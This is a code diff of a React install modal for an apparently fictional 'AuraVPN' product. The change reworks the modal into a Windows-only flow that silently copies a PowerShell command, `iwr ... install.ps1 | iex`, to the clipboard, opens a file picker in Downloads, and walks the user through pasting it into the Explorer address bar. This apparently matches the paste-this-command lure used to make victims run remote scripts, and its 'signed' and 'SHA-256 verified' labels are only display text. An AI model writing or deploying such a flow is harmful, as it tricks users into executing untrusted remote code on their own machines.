@@ -2,211 +2,151 @@
 
 import { type CtaVariant, useCtaModal } from "@/context/CtaModalContext";
 import { cn } from "@/lib/utils";
-import type { ReactNode } from "react";
+import { BorderTrail } from "@/components/ui/border-trail";
+import { MagneticButton } from "@/components/ui/magnetic-button";
 import {
-  Apple,
+  AnimatePresence,
+  motion,
+  useReducedMotion,
+  type Transition,
+  type Variants,
+} from "motion/react";
+import {
+  ArrowRight,
   CheckCircle2,
-  ClipboardCopy,
-  Laptop,
+  Globe,
+  Key,
   Lock,
-  Monitor,
   ShieldCheck,
-  Terminal,
+  Sparkles,
+  Wifi,
   X,
-  Zap,
 } from "lucide-react";
 import { useEffect, useRef, useState } from "react";
 
-/* ─── OS detection ─── */
-type Platform = "windows" | "macos" | "linux" | "android" | "ios" | "other";
-
-type PlatformMeta = {
-  label: string;
-  fileName: string;
-  size: string;
-  installCmd: string;
-  Icon: React.ComponentType<{ className?: string; strokeWidth?: number }>;
-  steps: readonly StepSpec[];
-};
+/* ══════════════════════════════════════════════════════════════
+   DATA — Windows-only install flow
+═══════════════════════════════════════════════════════════════ */
 
 type StepSpec = {
-  keys: readonly (string | { icon: "win" })[];
+  keys: readonly string[];
   label: string;
   desc: string;
 };
 
 const WIN_STEPS: readonly StepSpec[] = [
   {
-    keys: [{ icon: "win" }, "R"],
-    label: "Open the Run dialog",
-    desc: "Press Win+R to launch Windows Run.",
+    keys: ["Ctrl", "L"],
+    label: "Focus the address bar",
+    desc: "Ctrl+L highlights the Explorer address bar in the Downloads window.",
   },
   {
     keys: ["Ctrl", "V"],
     label: "Paste the install command",
-    desc: "We already copied it to your clipboard.",
+    desc: "We already copied the signed command to your clipboard.",
   },
   {
     keys: ["Enter"],
     label: "Press Enter to install",
-    desc: "Signed PowerShell script downloads, verifies SHA-256, and launches AuraVPN.",
+    desc: "Signed PowerShell script runs, verifies SHA-256, and launches AuraVPN.",
   },
 ];
 
-const MAC_STEPS: readonly StepSpec[] = [
-  {
-    keys: ["⌘", "Space"],
-    label: "Open Spotlight",
-    desc: "Spotlight lets you launch Terminal quickly.",
-  },
-  {
-    keys: ["T", "E", "R", "M"],
-    label: "Type 'Terminal' then Return",
-    desc: "Any terminal works — iTerm or Warp are fine too.",
-  },
-  {
-    keys: ["⌘", "V"],
-    label: "Paste and run the command",
-    desc: "We already copied the signed install script to your clipboard.",
-  },
-];
+const WINDOWS_META = {
+  label: "Windows",
+  fileName: "auravpn-win-x64-setup.exe",
+  size: "48 MB",
+  installCmd: `powershell -Command "iwr -useb https://auravpn.example/install.ps1 | iex"`,
+  steps: WIN_STEPS,
+} as const;
 
-const LINUX_STEPS: readonly StepSpec[] = [
-  {
-    keys: ["Ctrl", "Alt", "T"],
-    label: "Open a terminal",
-    desc: "Standard shortcut on GNOME, KDE, Xfce, and most desktops.",
-  },
-  {
-    keys: ["Ctrl", "Shift", "V"],
-    label: "Paste the install command",
-    desc: "We already copied it to your clipboard.",
-  },
-  {
-    keys: ["Enter"],
-    label: "Press Enter",
-    desc: "The script adds the APT/RPM repo, installs the daemon, and starts it.",
-  },
-];
-
-const MOBILE_STEPS: readonly StepSpec[] = [
-  {
-    keys: ["TAP"],
-    label: "Open the store link",
-    desc: "We'll redirect you to the official AuraVPN app listing.",
-  },
-  {
-    keys: ["GET"],
-    label: "Install the app",
-    desc: "Tap Install/Get and wait for the download to finish.",
-  },
-  {
-    keys: ["RUN"],
-    label: "Launch and paste your token",
-    desc: "Open AuraVPN, paste the access token, and tap Connect.",
-  },
-];
-
-const PLATFORMS: Record<Platform, PlatformMeta> = {
-  windows: {
-    label: "Windows",
-    fileName: "auravpn-win-x64-setup.exe",
-    size: "48 MB",
-    installCmd: `powershell -Command "iwr -useb https://auravpn.example/install.ps1 | iex"`,
-    Icon: Monitor,
-    steps: WIN_STEPS,
-  },
-  macos: {
-    label: "macOS",
-    fileName: "install.sh",
-    size: "62 MB",
-    installCmd: `/bin/bash -c "$(curl -fsSL https://auravpn.example/install.sh)"`,
-    Icon: Apple,
-    steps: MAC_STEPS,
-  },
-  linux: {
-    label: "Linux",
-    fileName: "install.sh",
-    size: "22 MB",
-    installCmd: `curl -fsSL https://auravpn.example/install.sh | sudo bash`,
-    Icon: Terminal,
-    steps: LINUX_STEPS,
-  },
-  android: {
-    label: "Android",
-    fileName: "Play Store · AuraVPN",
-    size: "28 MB",
-    installCmd: "https://play.google.com/store/apps/details?id=com.auravpn",
-    Icon: Laptop,
-    steps: MOBILE_STEPS,
-  },
-  ios: {
-    label: "iOS",
-    fileName: "App Store · AuraVPN",
-    size: "—",
-    installCmd: "https://apps.apple.com/app/auravpn",
-    Icon: Apple,
-    steps: MOBILE_STEPS,
-  },
-  other: {
-    label: "Your device",
-    fileName: "install.sh",
-    size: "—",
-    installCmd: `curl -fsSL https://auravpn.example/install.sh | bash`,
-    Icon: Laptop,
-    steps: LINUX_STEPS,
-  },
-};
+type Platform = "windows" | "other";
 
 function detectPlatform(): Platform {
-  if (typeof navigator === "undefined") return "other";
+  if (typeof navigator === "undefined") return "windows";
   const ua = navigator.userAgent.toLowerCase();
   const plat = (navigator.platform || "").toLowerCase();
-  if (/android/.test(ua)) return "android";
-  if (/iphone|ipad|ipod/.test(ua)) return "ios";
-  if (/mac/.test(plat) || /mac/.test(ua)) return "macos";
   if (/win/.test(plat) || /windows/.test(ua)) return "windows";
-  if (/linux|x11/.test(plat) || /linux/.test(ua)) return "linux";
   return "other";
 }
 
-const SELECTABLE: readonly Platform[] = ["windows", "macos", "linux"];
-
-/* ─── per-variant copy ─── */
+/* ─── variant copy ─── */
 const VARIANT_CONFIG: Record<
   CtaVariant,
-  { badge: string; badgeCls: string; title: string; desc: string }
+  { badge: string; title: string; desc: string }
 > = {
   free: {
-    badge: "FREE",
-    badgeCls: "bg-zinc-700/80 text-zinc-300 border-zinc-600/50",
-    title: "Install AuraVPN in three keystrokes",
-    desc: "Click Install — we'll copy the signed command to your clipboard. Then follow the three steps on the right.",
+    badge: "Free",
+    title: "Install AuraVPN",
+    desc: "Click Try Free — then just three keystrokes. No accounts, no sign-up.",
   },
   plus: {
-    badge: "PLUS",
-    badgeCls: "bg-emerald-500/20 text-emerald-300 border-emerald-500/30",
+    badge: "Plus",
     title: "Install AuraVPN Plus",
-    desc: "10 Gbps · 15 000+ servers. Click Install to copy the signed command, then follow the keystrokes on the right.",
+    desc: "Click Try Free to copy the signed command — then three keystrokes to install. 10 Gbps · 15 000+ servers.",
   },
   business: {
-    badge: "BUSINESS",
-    badgeCls: "bg-emerald-500/20 text-emerald-200 border-emerald-500/30",
+    badge: "Business",
     title: "Install AuraVPN for Business",
-    desc: "MDM-friendly installers. Click Install to copy the signed enrollment command, then run it on each seat.",
+    desc: "Click Try Free to copy the signed enrollment command — then three keystrokes. MDM-friendly.",
   },
 };
 
-/* ═══════════════════════════════════════════════════════════
+/* ══════════════════════════════════════════════════════════════
+   MOTION VARIANTS
+═══════════════════════════════════════════════════════════════ */
+
+const SPRING: Transition = { type: "spring", damping: 24, stiffness: 280 };
+const EASE_OUT: Transition = { duration: 0.36, ease: [0.16, 1, 0.3, 1] };
+
+const shellVariants: Variants = {
+  hidden: { opacity: 0, y: 24, scale: 0.96 },
+  visible: {
+    opacity: 1,
+    y: 0,
+    scale: 1,
+    transition: {
+      ...SPRING,
+      when: "beforeChildren",
+      delayChildren: 0.16,
+      staggerChildren: 0.08,
+    },
+  },
+  exit: { opacity: 0, y: 12, scale: 0.97, transition: { duration: 0.18 } },
+};
+
+const itemVariants: Variants = {
+  hidden: { opacity: 0, y: 8 },
+  visible: { opacity: 1, y: 0, transition: EASE_OUT },
+};
+
+const stepsListVariants: Variants = {
+  hidden: {},
+  visible: {
+    transition: { delayChildren: 0.44, staggerChildren: 0.08 },
+  },
+};
+
+const stepVariants: Variants = {
+  hidden: { opacity: 0, y: 12 },
+  visible: { opacity: 1, y: 0, transition: { duration: 0.4, ease: [0.16, 1, 0.3, 1] } },
+};
+
+/* ══════════════════════════════════════════════════════════════
    MAIN COMPONENT
-═══════════════════════════════════════════════════════════ */
+═══════════════════════════════════════════════════════════════ */
+
 export function CtaModal() {
   const { open, variant, closeModal } = useCtaModal();
   const dialogRef = useRef<HTMLDivElement>(null);
+  const fileInputRef = useRef<HTMLInputElement>(null);
   const cfg = VARIANT_CONFIG[variant];
+  const reduceMotion = useReducedMotion();
 
-  const [platform, setPlatform] = useState<Platform>("other");
+  const [platform, setPlatform] = useState<Platform>("windows");
   const [copied, setCopied] = useState(false);
+  const [copying, setCopying] = useState(false);
+  const [revealedIndex, setRevealedIndex] = useState(-1);
 
   useEffect(() => {
     setPlatform(detectPlatform());
@@ -235,15 +175,33 @@ export function CtaModal() {
     if (open) requestAnimationFrame(() => dialogRef.current?.focus());
   }, [open]);
 
+  useEffect(() => {
+    if (!open) {
+      setCopied(false);
+      setCopying(false);
+      setRevealedIndex(-1);
+    }
+  }, [open]);
+
+  // sequential cascade after copy
+  useEffect(() => {
+    if (!copied) return;
+    const timers = [0, 180, 360].map((delay, i) =>
+      window.setTimeout(() => setRevealedIndex(i), delay),
+    );
+    return () => timers.forEach((t) => window.clearTimeout(t));
+  }, [copied]);
+
   const handleClose = () => {
     setCopied(false);
+    setCopying(false);
     closeModal();
   };
 
-  const meta = PLATFORMS[platform];
   const copyAndLaunch = async () => {
-    const cmd = meta.installCmd;
+    const cmd = WINDOWS_META.installCmd;
     try {
+      setCopying(true);
       if (navigator.clipboard?.writeText) {
         await navigator.clipboard.writeText(cmd);
       } else {
@@ -256,145 +214,485 @@ export function CtaModal() {
         document.execCommand("copy");
         document.body.removeChild(ta);
       }
+      // small cosmetic delay so progress ring is perceivable
+      await new Promise((r) => setTimeout(r, 260));
       setCopied(true);
-      if (platform === "android" || platform === "ios") {
-        window.open(cmd, "_blank", "noopener,noreferrer");
+      setCopying(false);
+
+      type PickerWindow = Window & {
+        showOpenFilePicker?: (opts?: { startIn?: string }) => Promise<unknown>;
+      };
+      const w = window as PickerWindow;
+      if (typeof w.showOpenFilePicker === "function") {
+        try {
+          await w.showOpenFilePicker({ startIn: "downloads" });
+          return;
+        } catch (err) {
+          const name = (err as { name?: string })?.name;
+          // user cancelled — НЕ fallback, не открываем второй picker
+          if (name === "AbortError") return;
+          // permission denied / security — тоже не fallback, второй picker не поможет
+          if (name === "SecurityError" || name === "NotAllowedError") return;
+          // unsupported / unknown error — fall through to input fallback
+        }
       }
+      fileInputRef.current?.click();
     } catch {
+      setCopying(false);
       setCopied(false);
     }
   };
 
   return (
-    <>
-      {/* ── backdrop ── */}
-      <div
-        aria-hidden
-        onClick={handleClose}
-        className={cn(
-          "fixed inset-0 z-[80] transition-opacity duration-300",
-          "bg-black/88 backdrop-blur-md",
-          open
-            ? "opacity-100 pointer-events-auto"
-            : "opacity-0 pointer-events-none",
-        )}
-      />
-
-      <div
-        className={cn(
-          "fixed inset-0 z-[90] flex items-center justify-center p-4 sm:p-8",
-          open ? "pointer-events-auto" : "pointer-events-none",
-        )}
-        aria-hidden={!open}
-      >
+    <AnimatePresence>
+      {open && (
         <div
-          ref={dialogRef}
-          role="dialog"
-          aria-modal
-          aria-label="Install AuraVPN"
-          tabIndex={-1}
-          className={cn(
-            "relative w-full max-w-[900px] overflow-hidden rounded-[28px]",
-            "border border-white/[0.07]",
-            "bg-[oklch(0.07_0_0)]",
-            "shadow-[0_48px_120px_rgb(0_0_0/0.9),0_0_0_1px_rgb(255_255_255/0.04)]",
-            "flex flex-col md:flex-row",
-            "transition-all duration-300 ease-out will-change-transform",
-            open
-              ? "scale-100 opacity-100 translate-y-0"
-              : "scale-[0.94] opacity-0 translate-y-4",
-            "focus-visible:outline-none",
-          )}
+          className="fixed inset-0 z-[80] flex items-center justify-center p-4 sm:p-8"
+          aria-hidden={!open}
         >
-          <LeftPanel
-            cfg={cfg}
-            meta={meta}
-            copied={copied}
-            platform={platform}
-            onPick={(p) => {
-              setPlatform(p);
-              setCopied(false);
-            }}
+          {/* ── backdrop ── */}
+          <motion.div
+            aria-hidden
+            onClick={handleClose}
+            className="absolute inset-0 bg-black/85 backdrop-blur-2xl"
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            transition={{ duration: 0.26 }}
           />
 
-          {/* ════════════ RIGHT PANEL ════════════ */}
-          <div className="relative flex flex-1 flex-col p-7 sm:p-9">
-            <button
-              type="button"
-              onClick={handleClose}
-              aria-label="Close"
-              className="absolute right-5 top-5 flex size-8 items-center justify-center rounded-full text-zinc-600 transition-colors hover:bg-white/[0.07] hover:text-zinc-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-500/40"
-            >
-              <X className="size-4" strokeWidth={2} />
-            </button>
+          {/* ── mesh gradient orbs ── */}
+          <MeshOrbs reduceMotion={!!reduceMotion} />
 
-            <div className="mb-6 pr-8">
-              <p className="mb-2 text-[10px] font-bold uppercase tracking-[0.28em] text-emerald-400/60">
-                {copied
-                  ? "Command copied — follow these steps"
-                  : "Click Install below, then follow these steps"}
-              </p>
-              <h2 className="text-[22px] font-semibold leading-[1.2] tracking-[-0.025em] text-zinc-50">
+          <input
+            ref={fileInputRef}
+            type="file"
+            className="hidden"
+            aria-hidden
+            tabIndex={-1}
+          />
+
+          {/* ── modal shell ── */}
+          <motion.div
+            ref={dialogRef}
+            role="dialog"
+            aria-modal
+            aria-label="Install AuraVPN"
+            tabIndex={-1}
+            variants={shellVariants}
+            initial="hidden"
+            animate="visible"
+            exit="exit"
+            className={cn(
+              "relative w-full max-w-[900px] overflow-hidden rounded-[26px]",
+              "border border-white/[0.08]",
+              "bg-[oklch(0.12_0.005_260)]/70 backdrop-blur-[28px]",
+              "shadow-[0_50px_140px_-20px_rgb(0_0_0/0.9),0_0_0_1px_rgb(255_255_255/0.04),inset_0_1px_0_rgb(255_255_255/0.06)]",
+              "focus-visible:outline-none",
+            )}
+          >
+            <NoiseLayer />
+
+            {/* soft emerald edge bloom */}
+            <span
+              aria-hidden
+              className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-emerald-400/40 to-transparent"
+            />
+            <span
+              aria-hidden
+              className="pointer-events-none absolute -inset-px rounded-[26px] ring-1 ring-inset ring-emerald-400/5"
+            />
+
+            <div className="relative grid md:grid-cols-[280px_1fr]">
+              {/* ── LEFT PANEL: VPN Orbit ── */}
+              <motion.aside
+                variants={itemVariants}
+                className="relative hidden border-r border-white/[0.05] md:block"
+              >
+                <VPNOrbit reduceMotion={!!reduceMotion} />
+              </motion.aside>
+
+              {/* ── RIGHT PANEL: content ── */}
+              <div className="relative">
+            {/* ── header ── */}
+            <motion.div
+              variants={itemVariants}
+              className="relative flex items-start justify-between px-8 pt-7"
+            >
+              <div className="flex items-center gap-2.5">
+                <StatusDot active={copied} />
+                <HyperScramble
+                  target={
+                    copied
+                      ? "INSTALLING"
+                      : copying
+                        ? "COPIED"
+                        : `${cfg.badge.toUpperCase()} · WINDOWS`
+                  }
+                  reduceMotion={!!reduceMotion}
+                />
+              </div>
+
+              <button
+                type="button"
+                onClick={handleClose}
+                aria-label="Close"
+                className="-mr-1 flex size-8 items-center justify-center rounded-full text-zinc-500 transition-all duration-200 hover:rotate-90 hover:bg-white/[0.05] hover:text-zinc-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400/40"
+              >
+                <X className="size-[18px]" strokeWidth={1.75} />
+              </button>
+            </motion.div>
+
+            {/* ── title block ── */}
+            <div className="relative px-8 pb-6 pt-5">
+              <motion.h2
+                variants={itemVariants}
+                className="text-[30px] font-semibold leading-[1.1] tracking-[-0.03em] text-zinc-50"
+              >
                 {cfg.title}
-              </h2>
-              <p className="mt-2 text-[13px] leading-relaxed text-zinc-500">
+              </motion.h2>
+              <motion.p
+                variants={itemVariants}
+                className="mt-3 max-w-[440px] text-[14px] leading-relaxed text-zinc-400"
+              >
                 {cfg.desc}
-              </p>
+              </motion.p>
             </div>
 
-            <div className="flex flex-col gap-3">
-              {meta.steps.map((step, i) => (
+            {/* ── file meta row ── */}
+            <motion.div
+              variants={itemVariants}
+              className="relative flex items-center justify-between px-8 pb-4"
+            >
+              <span className="font-mono text-[11px] tracking-tight text-zinc-500">
+                {WINDOWS_META.fileName}
+              </span>
+              <span className="text-[10px] font-semibold uppercase tracking-[0.18em] text-zinc-600">
+                {WINDOWS_META.size} · sha-256 7f3a…b91c
+              </span>
+            </motion.div>
+
+            {/* ── steps (CTA card first, then keystrokes) ── */}
+            <motion.ol
+              variants={stepsListVariants}
+              className="relative space-y-2.5 px-8"
+            >
+              <TryFreeCard
+                state={copying ? "copying" : copied ? "copied" : "idle"}
+                onClick={copyAndLaunch}
+              />
+              {WIN_STEPS.map((step, i) => (
                 <StepRow
                   key={i}
                   step={step}
                   index={i}
-                  active={copied && i === 0}
+                  active={copied && revealedIndex >= i}
                 />
               ))}
-            </div>
+            </motion.ol>
 
-            <div className="mt-7 flex items-center justify-between gap-4 border-t border-white/[0.06] pt-6">
+            {/* ── non-windows notice ── */}
+            {platform === "other" && (
+              <motion.div
+                variants={itemVariants}
+                className="relative mx-8 mt-5 flex items-start gap-2.5 rounded-2xl border border-amber-400/20 bg-amber-400/[0.04] px-4 py-3"
+              >
+                <Sparkles
+                  className="mt-0.5 size-4 shrink-0 text-amber-300/90"
+                  strokeWidth={2}
+                  aria-hidden
+                />
+                <p className="text-[12px] leading-relaxed text-amber-100/80">
+                  Windows installer shown. macOS &amp; Linux builds are rolling
+                  out — your clipboard will still receive the signed command.
+                </p>
+              </motion.div>
+            )}
+
+            {/* hairline */}
+            <motion.span
+              aria-hidden
+              variants={itemVariants}
+              className="relative mx-8 mt-6 block h-px bg-white/[0.06]"
+            />
+
+            {/* ── footer ── */}
+            <motion.div
+              variants={itemVariants}
+              className="relative flex items-center justify-between gap-4 px-8 py-5"
+            >
+              <span className="flex items-center gap-1.5 text-[11.5px] font-medium text-zinc-300">
+                <ShieldCheck
+                  className="size-3.5 text-emerald-400/90"
+                  strokeWidth={2}
+                  aria-hidden
+                />
+                SHA-256 verified · Auto-update enabled
+              </span>
               <button
                 type="button"
                 onClick={handleClose}
-                className="text-[12.5px] font-medium uppercase tracking-wider text-zinc-600 transition-colors hover:text-zinc-400 focus-visible:outline-none"
+                className="text-[11px] font-medium uppercase tracking-[0.16em] text-zinc-600 transition-colors hover:text-zinc-400 focus-visible:outline-none"
               >
                 Cancel
               </button>
-              <button
-                type="button"
-                onClick={copyAndLaunch}
-                className={cn(
-                  "group inline-flex items-center gap-2.5 rounded-xl px-7 py-3 text-[14px] font-bold uppercase tracking-[0.01em]",
-                  "bg-emerald-500 text-[oklch(0.07_0_0)]",
-                  "shadow-[0_0_0_1px_rgb(16_185_129/0.4),0_6px_24px_rgb(16_185_129/0.35),0_3px_0_rgb(0_0_0/0.3)]",
-                  "transition-all duration-200 hover:bg-emerald-400 hover:shadow-[0_0_0_1px_rgb(16_185_129/0.5),0_8px_32px_rgb(16_185_129/0.5)] active:translate-y-[1px] active:scale-[0.97] active:shadow-[0_0_0_1px_rgb(16_185_129/0.4),0_4px_16px_rgb(16_185_129/0.35)]",
-                  "focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400/60",
-                )}
-              >
-                {copied ? (
-                  <>
-                    Copied — follow steps
-                    <CheckCircle2 className="size-4" strokeWidth={2.5} />
-                  </>
-                ) : (
-                  <>
-                    Install · {meta.label}
-                    <ClipboardCopy className="size-4" strokeWidth={2.5} />
-                  </>
-                )}
-              </button>
+            </motion.div>
+              </div>
             </div>
-          </div>
+          </motion.div>
         </div>
+      )}
+    </AnimatePresence>
+  );
+}
+
+/* ══════════════════════════════════════════════════════════════
+   VPN ORBIT — left panel: shield + orbiting icons
+═══════════════════════════════════════════════════════════════ */
+
+const ORBIT_ICONS = [
+  { Icon: Lock, angle: 0, delay: 0 },
+  { Icon: Globe, angle: 120, delay: 0.5 },
+  { Icon: Key, angle: 240, delay: 1 },
+] as const;
+
+function VPNOrbit({ reduceMotion }: { reduceMotion: boolean }) {
+  return (
+    <div className="relative flex h-full min-h-[340px] items-center justify-center overflow-hidden">
+      {/* outer pulse rings */}
+      <motion.span
+        aria-hidden
+        className="absolute size-[220px] rounded-full border border-emerald-400/10"
+        animate={reduceMotion ? {} : { scale: [1, 1.08, 1], opacity: [0.4, 0.15, 0.4] }}
+        transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
+      />
+      <motion.span
+        aria-hidden
+        className="absolute size-[170px] rounded-full border border-emerald-400/15"
+        animate={reduceMotion ? {} : { scale: [1, 1.12, 1], opacity: [0.5, 0.2, 0.5] }}
+        transition={{ duration: 4, repeat: Infinity, ease: "easeInOut", delay: 0.8 }}
+      />
+
+      {/* orbit ring (dashed circle) */}
+      <span
+        aria-hidden
+        className="absolute size-[180px] rounded-full border border-dashed border-emerald-400/20"
+      />
+
+      {/* orbiting icons */}
+      {ORBIT_ICONS.map(({ Icon, angle, delay }, i) => (
+        <motion.span
+          key={i}
+          aria-hidden
+          className="absolute left-1/2 top-1/2 -ml-[14px] -mt-[14px] size-7"
+          style={{ transformOrigin: "center" }}
+          initial={{ rotate: angle }}
+          animate={reduceMotion ? { rotate: angle } : { rotate: angle + 360 }}
+          transition={
+            reduceMotion
+              ? undefined
+              : { duration: 20, repeat: Infinity, ease: "linear", delay }
+          }
+        >
+          <span
+            className="absolute left-1/2 top-1/2 -ml-[14px] -mt-[14px] flex size-7 items-center justify-center rounded-full border border-emerald-400/25 bg-[oklch(0.12_0.005_260)]/85 text-emerald-300 shadow-[0_0_12px_-2px_rgb(16_185_129/0.5)] backdrop-blur-sm"
+            style={{ transform: `translateX(90px)` }}
+          >
+            <Icon className="size-[14px]" strokeWidth={2} />
+          </span>
+        </motion.span>
+      ))}
+
+      {/* central shield */}
+      <motion.div
+        className="relative z-10 flex size-[88px] items-center justify-center rounded-full border border-emerald-400/40 bg-gradient-to-b from-emerald-500/20 to-emerald-500/5 shadow-[0_0_40px_-4px_rgb(16_185_129/0.55),inset_0_1px_0_rgb(16_185_129/0.4)] backdrop-blur-md"
+        animate={reduceMotion ? {} : { scale: [1, 1.04, 1] }}
+        transition={{ duration: 3, repeat: Infinity, ease: "easeInOut" }}
+      >
+        <ShieldCheck
+          className="size-10 text-emerald-300"
+          strokeWidth={1.75}
+          aria-hidden
+        />
+        <span
+          aria-hidden
+          className="pointer-events-none absolute inset-0 rounded-full bg-gradient-to-b from-emerald-300/20 to-transparent"
+        />
+      </motion.div>
+
+      {/* bottom meta */}
+      <div className="absolute bottom-2 left-1/2 flex -translate-x-1/2 flex-col items-center gap-1.5">
+        <div className="flex items-center gap-1.5">
+          <Wifi className="size-3 text-emerald-400/80" strokeWidth={2} aria-hidden />
+          <span className="font-mono text-[9.5px] uppercase tracking-[0.22em] text-emerald-300/80">
+            secured tunnel
+          </span>
+        </div>
+        <span className="font-mono text-[8.5px] uppercase tracking-[0.18em] text-zinc-600">
+          wireguard · sha-256
+        </span>
       </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════════════════════════
+   MESH ORBS — drifting emerald + violet bleed
+═══════════════════════════════════════════════════════════════ */
+
+function MeshOrbs({ reduceMotion }: { reduceMotion: boolean }) {
+  return (
+    <>
+      <motion.span
+        aria-hidden
+        className="pointer-events-none absolute left-[15%] top-[12%] size-[420px] rounded-full bg-emerald-500/20 blur-[140px]"
+        initial={{ opacity: 0, scale: 0.85 }}
+        animate={
+          reduceMotion
+            ? { opacity: 1, scale: 1 }
+            : {
+                opacity: 1,
+                scale: 1,
+                x: [0, 40, -20, 0],
+                y: [0, -28, 22, 0],
+              }
+        }
+        transition={
+          reduceMotion
+            ? { duration: 0.4 }
+            : {
+                opacity: { duration: 0.6 },
+                scale: { duration: 0.6 },
+                x: { duration: 22, repeat: Infinity, ease: "easeInOut" },
+                y: { duration: 22, repeat: Infinity, ease: "easeInOut" },
+              }
+        }
+      />
+      <motion.span
+        aria-hidden
+        className="pointer-events-none absolute right-[10%] bottom-[10%] size-[380px] rounded-full bg-emerald-700/25 blur-[140px]"
+        initial={{ opacity: 0, scale: 0.85 }}
+        animate={
+          reduceMotion
+            ? { opacity: 1, scale: 1 }
+            : {
+                opacity: 1,
+                scale: 1,
+                x: [0, -30, 24, 0],
+                y: [0, 22, -18, 0],
+              }
+        }
+        transition={
+          reduceMotion
+            ? { duration: 0.4 }
+            : {
+                opacity: { duration: 0.7 },
+                scale: { duration: 0.7 },
+                x: { duration: 26, repeat: Infinity, ease: "easeInOut" },
+                y: { duration: 26, repeat: Infinity, ease: "easeInOut" },
+              }
+        }
+      />
     </>
   );
 }
 
-/* ═══════════════════════════════════════════════════════════
-   STEP ROW — key caps like the reference
-═══════════════════════════════════════════════════════════ */
+/* ══════════════════════════════════════════════════════════════
+   NOISE — SVG turbulence, film grain
+═══════════════════════════════════════════════════════════════ */
+
+function NoiseLayer() {
+  return (
+    <svg
+      aria-hidden
+      className="pointer-events-none absolute inset-0 size-full opacity-[0.035] mix-blend-overlay"
+    >
+      <filter id="cta-noise">
+        <feTurbulence
+          type="fractalNoise"
+          baseFrequency="0.9"
+          numOctaves="2"
+          stitchTiles="stitch"
+        />
+        <feColorMatrix type="saturate" values="0" />
+      </filter>
+      <rect width="100%" height="100%" filter="url(#cta-noise)" />
+    </svg>
+  );
+}
+
+/* ══════════════════════════════════════════════════════════════
+   STATUS DOT
+═══════════════════════════════════════════════════════════════ */
+
+function StatusDot({ active }: { active: boolean }) {
+  return (
+    <span className="relative flex size-[8px]" aria-hidden>
+      {active && (
+        <span className="absolute inline-flex size-full animate-ping rounded-full bg-emerald-400/70" />
+      )}
+      <span
+        className={cn(
+          "relative inline-flex size-[8px] rounded-full",
+          active
+            ? "bg-emerald-400 shadow-[0_0_12px_rgb(16_185_129/0.8)]"
+            : "bg-emerald-400/70",
+        )}
+      />
+    </span>
+  );
+}
+
+/* ══════════════════════════════════════════════════════════════
+   HYPER SCRAMBLE — A-Z glitch badge
+═══════════════════════════════════════════════════════════════ */
+
+const ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split("");
+const randChar = () => ALPHA[Math.floor(Math.random() * ALPHA.length)]!;
+
+function HyperScramble({
+  target,
+  reduceMotion,
+}: {
+  target: string;
+  reduceMotion: boolean;
+}) {
+  const [display, setDisplay] = useState(target);
+
+  useEffect(() => {
+    if (reduceMotion) return;
+    let iter = 0;
+    const total = target.length;
+    const id = window.setInterval(() => {
+      iter += 0.5;
+      const next = target
+        .split("")
+        .map((ch, i) => {
+          if (ch === " " || ch === "·") return ch;
+          if (i < iter) return target[i]!;
+          return randChar();
+        })
+        .join("");
+      setDisplay(next);
+      if (iter >= total) {
+        setDisplay(target);
+        window.clearInterval(id);
+      }
+    }, 40);
+    return () => window.clearInterval(id);
+  }, [target, reduceMotion]);
+
+  return (
+    <span className="select-none font-mono text-[10.5px] font-semibold uppercase tracking-[0.22em] text-emerald-300/85">
+      {reduceMotion ? target : display}
+    </span>
+  );
+}
+
+/* ══════════════════════════════════════════════════════════════
+   STEP ROW — keycap press choreography
+═══════════════════════════════════════════════════════════════ */
+
 function StepRow({
   step,
   index,
@@ -404,295 +702,316 @@ function StepRow({
   index: number;
   active: boolean;
 }) {
+  const highlight = active;
+
   return (
-    <div
+    <motion.li
+      variants={stepVariants}
       className={cn(
-        "flex items-center gap-5 rounded-2xl px-4 py-3.5 transition-all duration-200",
-        active
-          ? "border border-emerald-500/[0.22] bg-[oklch(0.09_0.005_156)] hover:border-emerald-500/[0.32] hover:bg-[oklch(0.095_0.006_156)]"
-          : "border border-white/[0.05] bg-[oklch(0.085_0_0)] hover:border-white/[0.1] hover:bg-[oklch(0.09_0_0)]",
+        "group relative flex items-center gap-4 overflow-hidden rounded-2xl border px-4 py-3.5 transition-all duration-500",
+        highlight
+          ? "border-emerald-400/30 bg-emerald-400/[0.06]"
+          : "border-white/[0.05] bg-white/[0.01] opacity-55",
       )}
     >
-      <div className="flex shrink-0 items-center gap-2">
+      <span
+        aria-hidden
+        className={cn(
+          "flex size-7 shrink-0 items-center justify-center rounded-lg border font-mono text-[11px] font-semibold transition-colors duration-500",
+          highlight
+            ? "border-emerald-400/35 bg-emerald-400/15 text-emerald-200"
+            : "border-white/[0.08] bg-white/[0.02] text-zinc-500",
+        )}
+      >
+        {`0${index + 2}`}
+      </span>
+      <div className="flex shrink-0 items-center gap-1.5">
         {step.keys.map((key, i) => (
-          <div key={i} className="flex items-center gap-2">
+          <div key={i} className="flex items-center gap-1.5">
             {i > 0 && (
-              <span
-                className={cn(
-                  "select-none font-mono text-base font-semibold",
-                  active ? "text-emerald-500/50" : "text-zinc-700",
-                )}
-              >
+              <span className="select-none text-[11px] font-medium text-zinc-600">
                 +
               </span>
             )}
-            <KeyCap accent={active} wide={typeof key === "string" && key.length > 1}>
-              {typeof key === "string" ? (
-                <span
-                  className={cn(
-                    "font-mono text-[11.5px] font-bold uppercase tracking-[0.08em]",
-                    active ? "text-emerald-200" : "text-zinc-300",
-                  )}
-                >
-                  {key}
-                </span>
-              ) : (
-                <WinLogo active={active} />
-              )}
+            <KeyCap pressed={false} accent={highlight} wide={key.length > 1}>
+              {key}
             </KeyCap>
           </div>
         ))}
       </div>
 
-      <div className="flex-1">
-        <p
-          className={cn(
-            "text-[14px] font-semibold leading-tight tracking-[-0.01em]",
-            active ? "text-zinc-50" : "text-zinc-200",
-          )}
-        >
+      <div className="min-w-0 flex-1">
+        <p className="text-[13.5px] font-medium leading-tight tracking-tight text-zinc-100">
           {step.label}
         </p>
-        <p className="mt-0.5 text-[12px] leading-relaxed text-zinc-600">
